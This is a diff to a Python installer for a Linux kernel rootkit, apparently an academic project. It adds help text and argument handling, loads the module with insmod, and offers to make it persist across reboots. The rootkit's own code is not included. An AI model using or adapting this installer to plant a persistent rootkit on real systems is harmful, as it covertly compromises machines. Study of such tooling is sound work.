@@ -4,9 +4,8 @@
 import os
 import sys
 import shlex
-import subprocess as sp
 from shutil import move
-# import argparse
+from subprocess import STDOUT, CalledProcessError, check_output
 
 #######
 # Prompting/Printing Helpers
@@ -15,6 +14,7 @@ from shutil import move
 colors = {
 	"RED": "\033[31m",
 	"GREEN": "\033[32m",
+	"YELLOW": "\033[33m",
 	"BLUE": "\033[34m",
 }
 
@@ -36,12 +36,24 @@ def print_status(text):
 	print(colors["BLUE"], style["BOLD"], text, style["RESET"])
 
 
+def print_question(text):
+	print(colors["YELLOW"], style["BOLD"], text, style["RESET"])
+
+
+def print_help():
+	print("Gardening Starter Pack (Rootkit) Usage")
+	print("Written by Aaron Lichtman, Arch Gupta and Brandon Weidner.")
+	print("\t--install\t\tinstall the rootkit.")
+	print("\t--uninstall\t\tuninstall the rootkit.")
+	print("\t-h \\ --help\t\tyou seem to have figured this one out already.")
+
+
 def prompt_yes_no(question):
 	"""
 	Prints question and waits for Y/N. Loops on invalid response.
 	Returns True if Yes, False if No..
 	"""
-	print_status(question + " [Y / N]")
+	print_question(question + " [Y / N]")
 	valid_response = False
 	while not valid_response:
 		response = input().strip().lower()
@@ -57,7 +69,7 @@ def prompt(text, default):
 	"""
 	Prompt with the option to leave the default.
 	"""
-	print_status(text + " [Default: {}]".format(default))
+	print_question(text + " [Default: {}]".format(default))
 	response = input().strip()
 	if response == "":
 		return default
@@ -71,21 +83,20 @@ def prompt(text, default):
 
 def run_cmd(command):
 	"""
-	Wrapper on subprocess.run to handle shell commands as either a list
-	of args or a single string.
-	:return: True if process exits successfully and False otherwise
+	Command can be either a list or a string. Exits if running command
+	returns an error.
 	"""
 	# TODO: Pipe all output to sp.DEVNULL when done fine-tuning build script.
 	if not isinstance(command, list):
 		command = shlex.split(command)
 
-	print_status("Executing: {}".format(command))
-	return sp.run(command, stdout=sp.PIPE, stderr=sp.PIPE).returncode == 0
-
-
-def run_cmd_error_handler():
-	print_error("Error running command. Exiting.")
-	sys.exit(1)
+	try:
+		print_status("Executing: {}".format(command))
+		check_output(command, stderr=STDOUT)
+	except CalledProcessError as exc:
+		print_error("Error running command. Exiting.")
+		print(exc.output)
+		sys.exit(1)
 
 
 def create_config_header_file(user_defines: dict):
@@ -175,24 +186,20 @@ def install(kernel_version):
 
 	try:
 		# TODO: Decide if moving the .ko file to the module_dir is necessary
-		# TODO: Actually load the kernel module
 		move(config["MODULE_NAME"] + ".ko", module_dest_path)
 	except IOError as e:
 		print_error("Unable to copy file. {}".format(e))
 		sys.exit()
 
-	# depmod && insmod /$MODULE/$MODULE.ko
-	if not run_cmd("depmod"):
-		run_cmd_error_handler()
-
-	if not run_cmd("insmod {}".format(module_dest_path)):
-		run_cmd_error_handler()
-
-	print_success("Successful installation.")
+	# Load the kernel module
+	run_cmd("depmod")
+	run_cmd("insmod {}".format(module_dest_path))
 
 	# Option to enable persistence by making the module load on boot.
 	if prompt_yes_no("Enable persistence?"):
 		enable_persistence(config["MODULE_NAME"])
+
+	print_success("Successful installation.")
 
 
 def uninstall():
@@ -202,12 +209,12 @@ def uninstall():
 def main():
 	kernel_version = validate_os_and_kernel()
 
-	# TODO: Set up argument parser.
-	# parser = argparse.ArgumentParser(description='Rootkit setup.')
-	# parser.add_argument("--install", help="install rootkit")
-	# args = parser.parse_args()
-
-	install(kernel_version)
+	if sys.argv[1] not in ["install", "uninstall"]:
+		print_help()
+	elif "install" == sys.argv[1]:
+		install(kernel_version)
+	elif "uninstall" == sys.argv[1]:
+		uninstall()
 
 
 if __name__ == "__main__":
